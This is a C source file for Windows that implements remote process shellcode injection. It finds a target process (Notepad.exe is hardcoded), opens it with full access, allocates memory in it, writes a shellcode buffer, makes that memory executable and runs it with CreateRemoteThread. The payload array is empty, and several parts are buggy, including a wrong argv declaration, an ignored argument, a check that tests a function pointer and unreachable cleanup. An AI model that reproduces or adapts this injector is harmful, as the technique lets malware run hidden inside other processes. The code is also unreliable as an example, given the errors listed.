#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <synchapi.h>

void *procname;

// declaring stuff (duh)
unsigned char shc[] = {0};
DWORD pid = 0;
LPVOID maddr = NULL;
SIZE_T shcsz = sizeof(shc);
HANDLE hProc = NULL;

// find proc ID by name
DWORD FindProcID(LPCWSTR trgproc){
    DWORD pid = 0; // fallback value in the case we dont get an actual PID
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    // creates snapshot of all processes on the system, HANDLE used to reference the kernel object created

    if (hSnap == INVALID_HANDLE_VALUE){
        printf("failed to take snapshot of processes");
        return 0;
    };

    PROCESSENTRY32W trgt; // creates a PROCESSENTRY32W struct for trgt
    trgt.dwSize = sizeof(trgt);

    if (Process32FirstW(hSnap, &trgt)){
        do{
            if (_wcsicmp(trgt.szExeFile, trgproc) == 0){ // compares current process' exe name w/ what we're looking for
                pid = trgt.th32ProcessID; // goes into a loop of searching for pids
                printf("found process %ls with pid %lu", trgt.szExeFile, pid); // outputs the procname and pid
                break; // exits the loop (no duh)
            }
        } while (Process32NextW(hSnap, &trgt)); // goes on to next process and fills trgt with fresh data


    }
    CloseHandle(hSnap); // cleanup so we dont leak a kernel resource
    return pid;
};

LPVOID m_alloc(HANDLE hProc){
    maddr = VirtualAllocEx(hProc, NULL, shcsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (maddr == NULL){
        printf("failed to allocate memory in process");
    };
    return maddr;
};

BOOL push_shc(LPVOID mem_addr, HANDLE hProc){
    SIZE_T byteswritten = 0;
    WriteProcessMemory(hProc, mem_addr, shc, shcsz, &byteswritten);
    if (byteswritten == 0){
        return 1;
    };
    return 0;
};

BOOL changeprot(LPVOID mem_addr, HANDLE hProc){
    DWORD oldprot = 0;
    VirtualProtectEx(hProc, mem_addr, shcsz, PAGE_EXECUTE_READ, &oldprot);
    return oldprot;
};

HANDLE trig_exe(HANDLE hProc, LPVOID mem_addr){
    HANDLE hThread = CreateRemoteThread(hProc, NULL, shcsz, (LPTHREAD_START_ROUTINE)mem_addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return hThread;
    CloseHandle(hThread);
};

BOOL free_mem(HANDLE hProc, LPVOID mem_addr){
    VirtualFreeEx(hProc, mem_addr, shcsz, MEM_DECOMMIT);
};


int main(int argc, char **argv[]){
    procname = argv[1];
    if (argc != 2){
        printf("usage: %s <procname>\n", argv[0]);
        return 1;
    };
    pid = FindProcID(L"Notepad.exe");
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    maddr = m_alloc(hProc);
    push_shc(maddr, hProc);
    if (!push_shc){
        printf("shellcode push failed");
        return 1;
    };
    changeprot(maddr, hProc);
    trig_exe(hProc, maddr);
    free_mem(hProc, maddr);
    CloseHandle(hProc);
    pid = 0;
    maddr = NULL;
    memset(shc, 0, shcsz);
}
